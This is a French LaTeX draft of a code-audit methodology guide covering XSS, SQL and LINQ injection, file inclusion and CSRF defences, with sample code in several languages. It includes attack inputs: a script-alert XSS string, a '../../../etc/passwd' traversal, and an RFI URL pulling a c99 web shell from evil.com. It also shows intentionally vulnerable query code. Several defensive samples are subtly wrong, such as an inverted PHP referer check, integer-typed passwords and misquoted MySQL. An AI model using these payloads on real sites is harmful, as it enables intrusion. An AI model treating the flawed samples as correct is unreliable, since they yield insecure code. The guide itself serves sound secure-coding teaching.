@@ -1,0 +1,670 @@
+\section{Méthodologie générale}
+
+\begin{Define}{Audit de code}
+Un audit de code ou revue de code vise à parcourir le code développé à la recherche de vulnérabilités. Cela permet également de vérifier que les contrôles de sécurité appropriés sont présents, qu'ils fonctionnent comme prévu, et qu'ils ont été utilisés aux bons endroits.\\
+L’audit de code est une bonne pratique permettant de trouver des vulnérabilités dans le code d’une application avant sa mise en production. Il y a plusieurs méthodes permettant d’évaluer la sécurité d’une application au niveau du code et il est recommandé d’en effectuer plusieurs pour avoir une évaluation la plus exacte possible du niveau de sécurité de l’application.
+\end{Define}
+\begin{Pre}
+Il est important de disposer de plusieurs informations avant de répondre à un appel d'offre d'audit de code :\begin{itemize}
+\item \textbf{Nombre de lignes de code} (LOC) : permet d’estimer la charge de travail
+\item \textbf{Technologies utilisées} : permet d'évaluer les points spécifiques
+\item \textbf{Points critiques} (\textit{Optionnel}): permet au client de préciser ses zones à risques
+\end{itemize}
+\end{Pre}
+Un audit de code se déroule en trois étapes :\begin{itemize}
+\item[\textbf{S}]cope: 
+Dans cette étape, le consultant doit identifier à l’aide des informations du client les points d'étude dans le code. Le consultant doit également prendre connaissance du contexte métier de l’application afin de se focaliser sur ses parties sensibles.
+\item[\textbf{A}]nalyse: 
+Cette étape permet d'étudier le code fourni et de réaliser des constatations d'audit en adéquation avec les critères d'audit.
+\item[\textbf{U}]sage (\textit{optionnel}): Le client peut demander une application pratique des vulnérabilités découvertes.
+\item[\textbf{F}]ormalisation: Cette étape conclut l’audit de code et permet de rassembler les éléments constatés pour produire un rapport qui sera fourni au client.
+\end{itemize}
+
+\section{Audit de code de service web}
+\subsection{Gestion des entrées utilisateurs: Cross-Site Scripting}
+\begin{Define}{Vulnérabilités!XSS}
+Une \gls{XSS} est une attaque consistant à injecter un code HTML, Javascript ou VB au sein d'une page web, visant à le faire exécuter par le navigateur du client de sorte d'induire un comportement anormal ou d'exploiter une vulnérabilité du-dit navigateur.\\Une XSS peut être:\begin{itemize}
+\item \textbf{Réfléchie}(\textit{Volatil}): Une XSS réfléchie est une XSS apparaissant dans un contexte particulier et temporaire avec, par exemple, une requête présente dans les données envoyées via POST ou GET. Elle s'exécute seulement après la requête et est fournie par le serveur.
+\item \textbf{Stockée} (\textit{Stored}): Une XSS stockée est une XSS archivée sur le site au sein d'une base de données ou insérée dans le code source. Elle s'exécute à chaque chargement de la page et est fournie par le serveur.
+\item \textbf{Locale} (\textit{DOM based XSS}): Une XSS locale est une XSS déclenchée purement côté navigateur car chargée par le code côté client (information au sein de l'URL). Ce type d'attaque est invisible côté serveur et dû à un manque de traitement côté client. Elle s'exécute seulement après la requête craftée et est fournie par le client.
+\end{itemize}
+\end{Define}
+
+Pour lutter contre les XSS de type stockée et réfléchie, il est nécessaire d'envisager deux approches: \textbf{filtrage} des entrées, \textbf{assainissement} des sorties.
+
+\subsubsection{Filtrage des entrées par REGEX}
+En .NET, la librairie \textbf{System.Text.RegularExpressions} permet d'effectuer un filtrage par \gls{REGEX}. Il est, par exemple, possible de n'autoriser que les caractères alphabétiques. La recommandation optimale est d'autoriser les caractères légitimes uniquement, comme par exemple les signes de ponctuation ou les apostrophes pour un texte. Ce simple contrôle peut se faire côté .NET ou ASP.NET et devrait participer à la défense en profondeur.
+\begin{Config}{csharp}{.NET: Filtrage en entrée - REGEX}
+using System.Text.RegularExpressions;
+//Filtrage des caractères alphabétiques et symboles présent dans un nom
+	if(!Regex.IsMatch(sender.name, @"^[\p{L} \.\-\']+$"))
+		throw new ApllicationException("Input not allowed");
+\end{Config}	
+\MarginPar{\textbf{.NET/ASP.NET}: Filtrage en entrée - REGEX}{0cm}Il est possible de réaliser ce type de filtrage avec ASP.NET en utilisant la  fonctionnalité \textit{asp:RegularExpressionValidator}
+\begin{Config}{aspx-cs}{ASP.NET: Filtrage en entrée - REGEX}
+<form id="form1" runat="server">
+	<asp:TextBox ID="Month" runat="server"/>
+	<asp:RegularExpressionValidator
+		ID="regexpDate" runat="server" ErrorMessage="Month-Year"
+		ControlToValidate="Month" ValidationExpression="^\d{2}-\d{4}$" />
+</form>
+\end{Config}
+Ces deux fonctions sont présentes nativement au sein des frameworks ASP.NET et .NET.\newline\newline
+En \gls{J2EE}, pour utiliser les \gls{REGEX},  il faut utiliser les classes \textit{Pattern} et \textit{Matcher} appartenant au package \textbf{java.util.regex}.\\
+La première étape est de définir le motif que l'on veut utiliser et créer une instance de la classe \textit{Pattern}\MarginPar{\textbf{Java}: Filtrage en entrée - REGEX}{0cm} correspondante.
+% Beaucoup trop long, on cherche le bon outil pas nécessairement de détailler l'UML...
+Une fois le motif compilé, la méthode \textit{Matcher} de la classe \textit{Pattern} permet d'interroger des chaines de caractères. 
+\begin{Config}{Java}{Java EE: Filtrage en entrée - REGEX}
+Pattern pattern = Pattern.compile ("^\\w+@[a-z]+\\.[a-z]{2,4}$");
+Matcher matcher = pattern.matcher ("test@example.com");
+\end{Config}\newline\newline
+
+En PHP, la librairie PCRE assure la gestion des \gls{REGEX}.\MarginPar{\textbf{PHP}: Filtrage en entrée - REGEX}{0cm} Cette librairie est présente nativement depuis PHP 4.0.
+\begin{Config}{php}{PHP: Filtrage en entrée - REGEX}
+<?php
+	$str = $_POST['year'];
+	preg_match('/\d{2,4}/', $str, $matches);
+	if($matches){echo "$str"}
+?>
+\end{Config}
+
+\subsubsection{Filtrage des entrées via une librairie dédiée}
+\MarginPar{\textbf{.NET/ASP.NET}: Filtrage en entrée - Librairie dédiée}{0cm}En .NET, il est possible de filtrer les entrées saisies à l'aide de la classe \textbf{HtmlSanitizer}, cette classe n'est pas native Windows.\\
+Il est possible de l'utiliser en utilisant la commande \tool{nuGet} suivante:\\
+\tool*{Install-Package HtmlSanitizer}[PM>]
+\begin{Config}{csharp}{.NET: Filtrage en entrée - Librairie dédiée}
+using Ganss.XSS;
+
+	var input=sender.name;
+	var sanitizer = new HtmlSanitizer();
+	field.Text=sanitize.Sanitize(input);
+\end{Config}	
+
+\subsubsection{Assainissement en sortie via un encodage HTML}
+L'encodage HTML permet l'affichage de caractères spéciaux HTML sans causer d'injection au sein du code.\\
+Par exemple, \\
+\indent \payloadhtml{<script>alert('blah');</script>}\\
+sera converti en:\\
+\indent \payloadhtml{&lt;script&gt;alert('blah');&lt;/script&gt;}\\
+
+En .NET, il est possible de réaliser cela avec la fonction \textbf{AntiXssEncoder.HtmlEncode} de la librairie Windows \textbf{System.Web.Security.AntiXss}.\MarginPar{\textbf{.NET}: Assainissement en sortie - REGEX}{0cm}
+\begin{Config}{csharp}{.NET: Assainissement en sortie via un encodage HTML}
+using System.Web.Security.AntiXss;
+
+	var input=sender.name;
+	field.Text= AntiXssEncoder.HtmlEncode(input, true);
+
+\end{Config}	
+
+Ce comportement est géré nativement en ASP.NET via l'utilisation de blocs de code incorporé (\textit{embedded code blocks}). Ces blocs échappent automatiquement le code en faisant appel à la librairie définie dans la variable \textbf{encoderType} du \textbf{web.config}. Par défaut la librairie utilisée est \textit{Server.HtmlEncode}.\\
+\begin{Config}{aspx-cs}{ASP.NET: Assainissement en sortie via un encodage HTML}
+	//Deux examples d'implémentation de blocs en ASP.NET/Razor
+	@sender.name
+	
+	<%:sender.name %>
+\end{Config}
+\MarginPar{\textbf{ASP.NET}: Assainissement en sortie - REGEX}{0cm}
+\begin{Config}{xml}{web.config: Assainissement en sortie via un encodage HTML}
+<configuration>
+	<system.web>
+		<compilation debug="false" targetFramework="4.5" />
+		<httpRuntime targetFramework="4.5" 
+			encoderType="System.Web.security.AntiXss.AntiXssEncoder"/>
+	</system.web>
+</configuration>
+\end{Config}
+
+\subsection{Gestion des entrées utilisateurs: Injection de code}
+\begin{Define}{Vulnérabilités!Injection de code}
+Une injection de code est une attaque consistant à injecter du code au sein d'une entrée utilisateur afin d'exécuter un code du côté du serveur. \`A l'inverse des injections XSS, ce type d'attaque vise le serveur afin de lire des données, d'exécuter des commandes à distance ou à rebondir vers des serveurs internes.\\
+Ce type d'attaque se divise en trois catégories:\begin{itemize}
+\item Injection en base de données: Ce type d'injection utilise le mauvais traitement d'entrée utilisateur pour faire exécuter du code par une base de données. Ce code peut permettre de faire fuir des données, d'injecter d'autres données, ou même d'injecter du code en cas de mauvaise configuration du \gls{SGDB}. Le code injecté s'exécutera dans le même contexte que la \gls{SGDB}.
+\item Injection de code brut: Ce type d'injection est possible lors de l'exploitation direct d'une entrée utilisateur via une commande système.
+\item Injection XPath
+\end{itemize}
+\end{Define}
+\subsubsection{Protection de l'entrée utilisateur}
+En PHP, la librairie native fournit des fonctions de traitements des entrées pour éviter les injections à partir d'une entrée utilisateur en échappant les caractères qui peuvent être interprété. Cette fonction est intégré dans le driver PDO de connexion à la base de donnée.
+\begin{Config}{php}{PHP: Échappement de l'entrée utilisateur}
+<?php
+$driver = new PDO('sqlite:/home/Methodologie/name.sql3');
+$string = "Pierre d'Huy `Admin`";
+print $driver->quote($string) . "\n";
+?>
+\end{Config}
+
+En .NET et en Java, aucune fionction de ce type n'existe avec une préférence pour les requêtes paramétrées. Cependant ce code peut être réalisé facilement à l'aide de fonction du type \textbf{\gls{REGEX}} ou \textit{Replace}.
+
+\subsubsection{Utilisation de Prepared Statements contre les injections en Base de données}
+\begin{Warning}
+Dans le cas des \textit{Prepared Statements}, le code utilise une requête préparée (potentiellement dynamiquement) et insère les paramètres dans la requête a posteriori via des fonctions spécifiques. \textbf{Il est important de lier ces paramètres aux entrées utilisateur et de ne pas utiliser les entrées utilisateur directement dans la requête}, ce qui rendrait l’utilisation des \textit{Prepared Statements} inutile.
+\end{Warning}
+
+Il est possible d'utiliser deux bibliothèques en .NET pour gérer les Prepared Statements: \textbf{SqlCommand} et \textbf{OlebCommand}. Ces librairies se distinguent sur le typage différent, par l'utilisation de driver de SGDB différents et par l'utilisation de paramètres nommés pour le premier.
+\begin{Config}{csharp}{.NET: Prepared Statements avec paramètres nommés (SQLCommand)}
+string cmd="SELECT * FROM users WHERE userid=@login AND password=@pass";
+SqlCommand c = new SqlCommand(cmd, connection);
+c.Parameters.Add("@login", SqlDbType.Int);
+c.Parameters["@login"].Value = userID;
+c.Parameters.Add("@pass", SqlDbType.Int);
+c.Parameters["@pass"].Value = password;
+SqlDataReader reader = command.ExecuteReader();
+\end{Config}	
+\MarginPar{\textbf{.NET}: Prepared Statement}{0cm}La bibliothèque \textit{OleDbCommand} ne supporte pas les paramètres nommés, cependant il est possible de les nommer pour la facilité d'usage. Les noms seront associés dans l'ordre d'apparition de la requête.
+\begin{Config}{csharp}{.NET: Prepared Statements avec marqueurs (OleDbCommand)}
+string cmd="SELECT * FROM users WHERE userid=? AND password=?";
+OleDblCommand c = new SqlCommand(cmd, connection);
+c.Parameters.Add("@p2", SqlDbType.Int);
+c.Parameters["@p2"].Value = userID;
+c.Parameters.Add("@p1", SqlDbType.Int);
+c.Parameters["@p1"].Value = password;
+OleDbDataReader reader = command.ExecuteReader();
+\end{Config}	\newline\newline
+Avec \gls{J2EE}, la classe \textbf{PreparedStatement} représente une instruction SQL précompilée qui peut être exécuté plusieurs fois sans avoir à être recompiler pour chaque exécution.
+L’utilisation de cet objet permet de se prémunir contre l’injection d’instructions SQL par des attaquants.
+Il est cependant important d’être prudent lors de l’usage de cet classe. En effet, sa mauvaise utilisation rend l’application toujours vulnérable aux injections SQL.\\
+
+\begin{Config}{java}{Java EE: Prepared Statement}
+uPreparedStatement stmt = 
+	connection.prepareStatement("SELECT * FROM users WHERE userid=? AND password=?");
+stmt.setString(1, userid);
+stmt.setString(2, password);
+ResultSet rs = stmt.executeQuery();
+\end{Config}	
+
+\MarginPar{\textbf{Java}: Prepared Statement}{0cm} Ce code n’est pas vulnérable aux injections SQL car il utilise correctement les requêtes paramétrées. En utilisant la classe PreparedStatement de Java en liant les variables (avec les points d'interrogation) aux méthodes \textit{setString} correspondantes, les  injections SQL peuvent être facilement évitée.
+
+\begin{Config}{java}{Java EE: Prepared Statement vulnérable}
+
+String query = 
+	"SELECT * FROM users WHERE userid ='"+ userid + "'" + " AND password='" + password + "'";
+PreparedStatement stmt = connection.prepareStatement(query);
+ResultSet rs = stmt.executeQuery();
+
+\end{Config}	
+
+Ce code est vulnérable aux injections SQL car il utilise des requêtes dynamiques pour concaténer des données malveillantes à la requête elle-même. \newline\newline
+
+
+En PHP, la classe \textbf{PDOStatement}, disponible depuis PHP 5.0, permet de créer et d’exécuter des instructions SQL paramétrées.\MarginPar{\textbf{PHP}: Prepared Statement}{0cm}
+La méthode \textit{prepare} de la classe PDOStatement sert à créer une instruction qui sera ensuite exécuter avec la méthode \textit{execute}.
+
+Une requête SQL crée par la méthode \textit{prepare} peut contenir des paramètres nommés ( :name) ou des marqueurs (?) qui seront ensuite remplacés par les paramètres désirés à l’exécution de la requête.
+
+\begin{Config}{php}{PHP: Prepared Statement avec paramètres nommés}
+<?php
+/* Execute a prepared statement by passing an array of values */
+$sql = 'SELECT name, colour, calories
+    FROM fruit
+    WHERE calories < :calories AND colour = :colour';
+$sth->execute(array(':calories' => 150, ':colour' => 'red'));
+$result = $sth->fetchAll();
+?>
+\end{Config}
+
+\begin{Config}{php}{PHP: Prepared Statement avec marqueurs}
+<?php
+/* Execute a prepared statement by passing an array of values */
+$sth = $dbh->prepare('SELECT name, colour, calories
+    FROM fruit
+    WHERE calories < ? AND colour = ?');
+$sth->execute(array(150, 'red'));
+$result = $sth->fetchAll();
+?>
+\end{Config}
+
+\subsubsection{Utilisation de mapping objet-relationnel}
+Les \textbf{\gls{ORM} Frameworks} permettent de gérer les requêtes sous la forme de méthodes d'objet. Ces frameworks permettent donc, entre autres, de paramétrer les requêtes.\\
+.NET propose la solution Entity Framework qui permet à l'utilisateur de gérer les requêtes suivants deux méthodes: \textit{EntitySQL} et \textit{Link-To-Entities}.
+EntitySQL implémente \gls{EDM}. Ce modèle permet de traiter les données en sortie comme un objet. En utilisant \textbf{EntityCommand}, il est possible de paramétrer les requêtes avec la méthode \textit{Parameteters}.
+\begin{Config}{csharp}{.NET: Prepared Statements avec EntitySQL}
+    string esqlQuery =
+        @"SELECT VALUE Contact FROM AdventureWorksEntities.Contacts 
+                    AS Contact WHERE Contact.LastName = @ln AND
+                    Contact.FirstName = @fn";
+
+    using (EntityCommand cmd = new EntityCommand(esqlQuery, conn))
+    {
+        EntityParameter param1 = new EntityParameter();
+        param1.ParameterName = "ln";
+        param1.Value = "Adams";
+        EntityParameter param2 = new EntityParameter();
+        param2.ParameterName = "fn";
+        param2.Value = "Frances";
+
+        cmd.Parameters.Add(param1);
+        cmd.Parameters.Add(param2);
+
+        using (DbDataReader rdr = cmd.ExecuteReader(CommandBehavior.SequentialAccess))
+        {
+            // Iterate through the collection of Contact items.
+            while (rdr.Read())
+            {
+                Console.WriteLine(rdr["FirstName"]);
+                Console.WriteLine(rdr["LastName"]);
+            }
+        }
+    }
+\end{Config}
+
+Avec \textbf{Link-To-Entities}, il est également possible de réaliser des commande en utilisant un style pseudo-SQL (Query Syntax) ou en considérant la requête \MarginPar{\textbf{.NET}: Mapping relationnel}{0cm}comme un objet. Dans le cas de la \textit{Query Syntax}, tous les paramètres dynamiques c'est-à-dire ajouté par une variable seront automatiquement paramétrés dans la requête SQL résultante. Cependant une injection hardcodée (par exemple l'interprétation directe d'une phrase pouvant être modifié par un utilisateur) peut faire l'objet d'une injection. Dans le cas de la \textit{Method Syntax}, le développeur peut également utilisé une syntaxe SQL en utilisant \textbf{Dynamic Linq Syntax}. Cette option permet de réaliser des Linq injections. Pour éviter ce type d'attaque, il est nécessaire d'utiliser des \textit{placeholders}.
+
+\begin{Config}{csharp}{.NET: ORM avec Link-To-Entities}
+    // Query Syntax
+    var L2EQuery = from it in context.Store
+    	where it.Item == "craft"
+    	select it;
+    var item = L2EQuery.FirstOrDefault<item>();
+    
+    //Method Syntax avec Dynamic Linq Syntax
+    var L2EQuery = context.Store.where("i=>i.ItemName == \""+user_input+"\" and allowed == 1" );
+    var item = L2EQuery.FirstOrDefault<item>();
+    
+    //Method Syntax avec Dynamic Linq Syntax et placeholder
+    var L2EQuery = context.Store.where("i=>i.ItemName == @0 and allowed == 1", user_input );
+    var item = L2EQuery.FirstOrDefault<item>();
+\end{Config}
+
+En PHP, il est possible de réaliser l'interfaçage ORM à l'aide de la librairie externe \textbf{Doctrine}
+\begin{Config}{php}{PHP: Inititation ORM avec Doctrine}
+<?php
+class Users extends Doctrine_Record
+{
+    public function setTableDefinition()
+    {
+    	$this->setTableName('users');
+	$this->hasColumn('id', 'integer', 42, array('primary' => true, 'autoincrement' => true));
+	$this->hasColumn('Name', 'string', 100);
+	$this->hasColumn('Roles', 'string', 100);
+    }
+}
+?>
+\end{Config}
+\begin{Config}{php}{PHP: Utilisation ORM avec Doctrine}
+<?php
+$myUsers = new Users();
+$myUsers->Name = "Pierre d'Huy"; 
+$myUsers->Roles = 'Admin';
+$myUsers->save();
+?>
+\end{Config}
+Doctrine échappe la chaine de caractère pour l'insérer. Cependant Doctrine seul ne garantit pas une protection complète contre les injections SQL. Sa documentation officielle recommande d'utiliser en complément les fonctions de Prepared Statement.
+
+\subsubsection{Protection par l'utilisation de procédures stockées}
+Il est possible d'utiliser des procédures stockées afin de protéger le code de l'injection à l'échelle de la base de données. Il est nécessaire pour cela de prendre en compte le fait que ce type de procédures doit être audité avec attention de même que leurs appels ne doivent pas laisser la possibilité de les contourner.
+
+Il est possible de réaliser des procédure en utilisant \gls{T-SQL}, le langage de programmation SQL des \textit{SQL Server}. \gls{T-SQL} offre deux fonctions native pour protéger les entrées utilisateurs: \textit{QUOTENAME} et \textit{sp\_executesql}.\\ \textit{QUOTENAME} permet d'échapper une chaine de caractère en accord avec le paramètre QUOTED\_IDENTIFIER. Si ce paramètre est positionné à \textit{on}, T-SQL respecte le standard SQL (double quote pour un objet, quote pour une chaine de caractère), s'il est positionné à \textit{off} il respecte la norme Microsoft (crochet pour un objet, double quote pour une chaine de caractères).
+
+\begin{Config}{tsql}{T-SQL: QUOTENAME()}
+SET @var=QUOTENAME(@variable);
+IF ISDATE(@var) = 1
+  SELECT * FROM blog WHERE date=@var;
+ELSE 
+  PRINT 'ERROR';
+\end{Config}
+\MarginPar{\textbf{T-SQL}: Procédure stockée}{0cm}
+\textit{sp\_executesql} permet de réaliser le casting d'une variable en un type donné.
+\begin{Config}{tsql}{T-SQL: sp\_executesql}
+DECLARE @SQL NVARCHAR(1000);
+SET @SQL = 'SELECT * FROM users WHERE user=@Field1';
+EXECUTE sp_executesql @SQL, N'@Field1 VARCHAR(10)', @user ;
+\end{Config}
+
+Il également possible de réaliser ce filtrage avec MySQL.
+\begin{Config}{mysql}{MySQL: QUOTE()}
+CREATE PROCEDURE escaperequest(in variable text)
+BEGIN    
+    SET @s = CONCAT('INSERT INTO `users` (`details`) VALUES(\'', QUOTE(variable), '\')');
+    PREPARE stmt FROM @s;
+    EXECUTE stmt;
+    COMMIT;
+END;
+\end{Config}
+
+%% Manque injection Xpath et commande
+
+\subsection{Gestion des entrées utilisateurs: File Inclusion}
+\begin{Define}{Vulnérabilités!LFI}
+Une \gls{LFI} est une inclusion de fichier local par l'utilisation d'un mécanisme de lecture présent dans le code, comme par exemple l'inclusion d'un paramètre GET d'un document à charger. Cela peut servir à lire des fichiers locaux propres aux systèmes d'exploitation ou au serveur web comme par exemple, les fichiers .htaccess sur debian ou web.config sur IIS.
+\end{Define}
+
+L'accès à la page pourrait être fait via l'URL: \url{http://example.com/preview.php?file=example.html}. En modifiant l'URL à \url{http://example.com/preview.php?file=../../../etc/passwd}, l'attaquant pourrait accéder au fichier /etc/passwd qui sur les serveurs Unix donnent de précieuses informations sur les utilisateurs d'un serveur.\\
+
+Cette menace peut être restreinte côté serveur par l'usage d'une vérification des entrées utilisateurs via des \gls{REGEX}. La gestion d'accès peut également se faire via la configuration du serveur. Par défaut l'accès à l'arborescence du dossier racine du serveur web est interdite mais l'utilisation de dossier virtuel peut permettre de contourner cette restriction.\\
+Par exemple, en ASP.NET, le fichier web.config permet de restreindre les accès par utilisateurs identifiés.
+\begin{Config}{XML}{web.config: Deny Folder Access}
+<location path="upload/" >
+<system.web>
+	<security>
+		<authorization>
+			<add accessType="Deny" roles="*" verbs="PUT">
+		</authorization>
+	</security>
+</system.web>
+\end{Config}
+
+\begin{Define}{Vulnérabilités!RFI}
+Une \gls{RFI} est une inclusion d'un fichier distant par l'utilisation d'un mécanisme de lecture présent dans le code, comme par exemple l'inclusion d'un paramètre GET d'un document à charger. Cela peut servir notamment à inclure un code javascript malveillant exécuté par l'utilisateur ou un code exécuté par le serveur.
+\end{Define}
+
+En reprenant l'exemple précédent, l'attaquant pourrait exécuter la requête via l'URL: \url{http://example.com/preview.php?file=http://evil.com/c99.aspx}.\\
+En cas de nécessité d'inclure des pages distantes, il est recommandé de restreindre l'exécution des fichiers par Content-Type et par origine.\\
+L'implémentation d'une restriction peut se faire en utilisant des fonctions natives comme la fonction \textit{IsWellFormedUriString()} en .NET. Cette fonction permet de vérifier la structure d'une URL et sa conformité par rapport aux \gls{RFC}.
+\begin{Config}{csharp}{.NET: Vérification d'URI relative}
+var uri= Request.QueryString["Uri"];
+if (!Uri.IsWellFormedUriString(uri,UriKind.Relative)){
+	throw new ApplicationException("URI not allowed");
+}
+\end{Config}
+
+La vérification basée sur liste blanche peut également se réaliser en utilisant la classe \textbf{DbContext}.
+\begin{Config}{csharp}{.NET: Vérification par liste blanche}
+//var db = new DbContext();
+// [...]
+var uri= Request.QueryString["Uri"];
+if (!db.WhiteListURLs.Where(u => u.URL == url).Any()){
+	throw new ApplicationException("URI not allowed");
+}
+\end{Config}
+
+\subsection{Gestion des sessions: CSRF}
+\begin{Define}{Vulnérabilités!CSRF}
+Une \gls{CSRF} est une attaque consistant à induire un utilisateur connecté à réaliser une action à son insu. Ce type d'attaque se réalise par la réalisation d'une requête par l'utilisateur. Elle peut se réaliser par un fichier HTML ou PDF malveillant, l'accès à une page web ou en utilisant une autre vulnérabilité (\gls{XSS}, unvalidated redirection...).
+Une \gls{CSRF} peut se contrer en utilisant:\begin{itemize}
+\item Une vérification de l'origine du visiteur
+\item Un \textit{token} anti-CSRF
+\item Une double validation
+\end{itemize}
+\end{Define}
+
+\subsubsection{Vérification de l'origine du visiteur par referer}
+L'origine d'un visiteur peut être déterminé par le header \gls{HTTP} \textit{\gls{Referer}} si celui-ci est envoyé. En effet le \textit{\gls{Referer}} permet d'obtenir la provenance d'un visiteur.
+\begin{Config}{http}{HTTP: Header Referer}
+GET https://en.wikipedia.org/wiki/Test HTTP/1.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Encoding: gzip, deflate, sdch, br
+Accept-Language: fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4
+Cookie: WMF-Last-Access=18-Brum-VIII
+Referer: https://www.google.fr/
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
+\end{Config}
+
+L'obtention du \gls{Referer} peut se faire aisément en utilisant une fonction native de .NET.
+
+\begin{Config}{csharp}{.NET: Vérification du Referer}
+var referer = request.UrlReferrer;
+if (referer == null || referer.Host != Request.Url.Host )
+	throw new ApplicationException("Erroneous referer");
+\end{Config}
+
+Cette vérification peut s'exécuter en PHP avec la variable globale \textit{\$\_SERVER}
+\begin{Config}{php}{PHP: Vérification du Referer}
+<?php
+	$ref=$_SERVER['REFERER']
+	if($ref == "example.com"){
+		echo "Erroneous referer"
+	}
+\end{Config}
+
+\subsubsection{Implémentation d'un token anti-CSRF (en POST)}
+Le traitement normal contre les \gls{CSRF} consiste normalement en l'utilisation d'un \textit{token} aléatoire propre à chaque page. Ce \textit{token} est généralement nommé \textit{token anti-CSRF}. Il permet de garantir que la provenance d'une requête est bien celle attendue dans le cas d'un formulaire. Dans le cas d'un utilisateur authentifié, cela permet de garantir que l'utilisateur a bien rempli une page donnée avant d'effectuer cette requête. \\
+L'usage le plus courant consiste à utiliser un champ \textit{hidden} dans le formulaire. 
+
+\begin{Warning}
+Cette méthode peut poser des problèmes, notamment dans le cas d'une XSS. En effet, l'attaquant peut utiliser une XSS pour lire la DOM de la page et ainsi déterminer la valeur du  \textit{token}.
+\end{Warning}
+
+Il est possible de créer ce \textit{token} en utilisant une donnée difficile à deviner, comme par exemple, le \gls{SID} de l'utilisateur. Le SID étant normalement propre à une session (voir \hyperref[SessionManagement]{Gestion des sessions}) et complètement aléatoire, il s'agit d'une donnée particulièrement efficace pour ce type d'usage. Afin d'éviter le vol du SID, il est recommandé d'en réaliser le condensat voir d'y appliquer un sel.\\
+L'exemple suivant implémente la fonction en .NET.\\
+\begin{Config}{csharp}{.NET: Création d'un token anti-CSRF à partir du SID}
+Protected override OnInit(EventArgs e){
+	base.OnInit(e);
+	if (User.Identity.IsAuthenticated){
+		HashAlgorithm sha = new SHA1CryptoServiceProvider();
+		byte[] result = sha.ComputeHash(Session.SessionID);
+		Session["AntiCSRF"]=System.Convert.ToBase64String(result, 0, 15);
+	}
+\end{Config}
+
+La méthode précédente expose cependant à un problème majeur. En effet, la constance du \textit{token} sur la session fait que le vol du SID à un moment donné reste vrai pour toute la session. Il est recommandé quand c'est possible d'utiliser un \gls{CSPRNG} pour la source du \textit{token} ou une fonction native du framework.\\
+Le framework MVC en .NET permet d'intégrer le \textit{token} directement dans la génération de la page.
+
+\begin{Config}{aspx-cs}{ASP.NET: Intégration du token anti-CSRF dans un formulaire MVC}
+@using (Html.BeginForm())
+{
+	@Html.AntiForgeryToken()
+	@Html.LabelFor(m => m.Status)
+	@Html.TextBoxFor(m => m.Status)
+	<input type="submit" value="Update Status" />
+}
+\end{Config}
+
+Le code ci-dessus génère un champ caché contenant le token anti-CSRF dans le code du formulaire et dans le cookie \textbf{\_\_RequestVerificationToken}. Le code .NET côté serveur nécessite l'utilisation de l'attribut \textbf{ValidateAntiForgeryToken}. Ainsi la fonction de vérification du \textit{token} sera de la forme suivante.
+\begin{Config}{csharp}{.NET: Vérification du token anti-CSRF de MVC}
+[HttpPost]
+[Authorize(Roles="Administrators")]
+[ValidateAntiForgeryToken]
+public ActionResult Index(model){
+	if(ModelState.IsValid){
+		//Le token anti-CSRF a été vérifié
+	}
+}
+\end{Config}
+La configuration du \textit{token} anti-CSRF doit se faire dans le fichier de configuration ASP.NET, \textbf{Global.asax.cs}. Il est recommandé de configurer l'utilisation de \gls{SSL} (\gls{HTTPS}) et de rajouter de l'entropie dans les sources de données: par exemple l'utilisation d'un fournisseur supplémentaire d'entropie complémentaire (utilisant l'interface \textit{IAntiForgeryAdditionalDataProvider}) ou d'une source supplémentaire (utilisant la classe \textit{ClaimTypes}).
+\begin{Config}{csharp}{.NET: Configuration du token anti-CSRF}
+//Global.asax.cs
+private static void ConfigureAntiForgeryTokens(){
+	AntiForgeryConfig.AdditionalDataProvider = myDataProvider;
+	AntiForgeryConfig.RequireSsl = true;
+	UniqueClaimeTypeIdentifier = ClaimTypes.country;
+}
+\end{Config}
+
+\subsubsection{Implémentation d'un token anti-CSRF (en AJAX)}
+
+Cependant cette méthode est inexploitable en AJAX. MVC fournit dans ce cas les fonctions \textit{AntiForgery.GetTokens} et \textit{AntiForgery.Validate}. De cette manière, le \textit{token} peut être transmis dans le header de transmission de fichier JSON. Dans l'exemple suivant, le header est d'abord créé en ASP.NET puis vérifié en .NET.
+\begin{Config}{aspx-cs}{ASP.NET: Intégration du token anti-CSRF dans une requête AJAX}
+@functions{
+	public string TokenHeaderValue(){
+		string cookieToken, formToken;
+		AntiForgery.GetTokens(null,out cookieToken, out formToken);
+		return cookieToken + ":" + formToken;
+	}
+}
+
+$.ajax({
+    type: "GET",
+    beforeSend: function (xhr, settings)
+    {
+        $.extend(settings, { headers: { "RequestVerificationToken", TokenHeaderValue() } });
+    },
+    url: url,
+    dataType: "json",
+    processData: false,
+    crossDomain: true
+});
+\end{Config}
+
+\begin{Config}{csharp}{.NET: Vérification du token anti-CSRF dans une requête AJAX}
+if (request.Headers.TryGetValues("RequestVerificationToken", out tokenHeaders)){
+	string tokens = tokenHeaders.First().Split(':');
+	if (tokens.Length == 2){
+		cookieToken = tokens[0].Trim();
+		formToken = tokens[1].Trim();
+	}
+}
+AntiForgery.Validate(cookieToken,formToken);
+\end{Config}
+
+\subsubsection{Recommandations complémentaires}
+D'autres solutions peuvent être utilisées pour renforcer le contrôle de provenance:\begin{itemize}
+\item Utilisation d'un champ de \gls{CAPTCHA}
+\item Ré-authentification ou une confirmation du mot de passe
+\item Envoi d'un \gls{OTP}
+\end{itemize}
+
+La mise en place d'un CAPTCHA peut se faire aisément en utilisant les bibliothèques consacrées comme reCAPTCHA.
+
+\subsection{Gestion des sessions: fixation, injection, vol}
+\begin{Define}{SID}
+Une session est identifiée, côté serveur, par un \gls{SID}. Le SID est une information partagée entre le navigateur et le serveur et permet à un navigateur de se faire reconnaitre auprès du serveur. Il peut prendre différentes formes: cookie, données POST, dans l'URL... La meilleure implémentation consiste cependant à transmettre cette donnée dans un cookie de session. Du fait de l'importance du \gls{SID}, de nombreuses protections doivent être mises en place contre son vol ou son usage par un tiers.
+\end{Define}
+
+\subsubsection{Injection de SID}
+\begin{Define}{Vulnérabilités!SID (Injection)}
+Une injection de \gls{SID} consiste en la capacité par l'attaquant de paramétrer le SID de la victime au sein du site. Cela peut se faire par l'utilisation du SID dans l'URL, dans une requête POST ou dans le cookie si celui-ci n'est pas protégé correctement contre les attaques XSS. Une fois injecté, l'attaquant pourra accéder aux informations de la victime quand elle se connecte.
+\end{Define}
